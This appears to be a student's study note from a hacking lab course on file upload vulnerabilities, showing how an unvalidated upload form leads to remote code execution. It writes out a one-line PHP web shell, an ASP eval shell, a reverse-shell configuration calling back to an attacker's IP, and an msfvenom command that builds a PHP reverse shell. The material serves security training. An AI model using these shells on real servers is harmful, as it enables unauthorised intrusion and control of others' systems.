# 🐌 File Upload Attacks

The worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload` vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

The most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the back-end server by uploading a web shell or uploading a script that sends a reverse shell.

#### **Basic Exploitation**

The most basic type of file upload vulnerability occurs when the web application `does not have any form of validation filters` on the uploaded files, allowing the upload of any file type by default.

Let's imagine a upload form that does not specify what type of file we can upload:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a `Web Shell` script and a `Reverse Shell` script.

A web shell prints it's output back to us within the web browser. It has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts.

Let's say we have a website `http://SERVER_IP:PORT/`, as the `index` page is usually hidden by default. But, if we try visiting `http://SERVER_IP:PORT/index.php`, we would get the same page, which means that this is indeed a `PHP` web application.

but if not we can juste use [Wappalyzer](https://www.wappalyzer.com)

To start exploiting the vuln , let's start by writing `<?php echo "Hello HTB";?>` to `test.php`, and try uploading it to the web application

we get a message saying `File successfully uploaded` and if we go to `http://SERVER_IP:PORT/uploads/test.php`

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

_**Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.**_

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

## Upload Exploitation

### Web Shell

Now we will try to be able to interact with it to take control over the back-end server.

A good webshell for `PHP` is [phpbash](https://github.com/Arrexel/phpbash) and good to know but [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/opt/useful/SecLists/Web-Shells` directory in `PwnBox`.

It's good practice to know how to write our own webshell:

```php
<?php system($_REQUEST['cmd']); ?>
```

add `?cmd=id` after the request to enter the command

For `.NET` web applications:

```aspnet
<% eval request('cmd') %>
```

### Reverse Shell

One reliable reverse shell for `PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. Furthermore, the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.

After changing the IP and port

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

We launch our listener with netcat, upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection

### Custom Reverse Shell

`msfvenom` can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for `PHP`

```shell-session
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
